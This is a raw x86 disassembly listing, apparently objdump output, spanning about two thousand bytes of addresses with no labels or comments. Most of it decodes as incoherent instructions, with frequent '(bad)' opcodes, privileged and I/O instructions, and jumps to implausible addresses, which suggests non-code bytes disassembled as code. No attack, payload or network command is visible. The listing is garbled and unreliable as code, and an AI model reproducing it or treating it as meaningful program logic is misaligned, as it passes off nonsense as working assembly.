  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
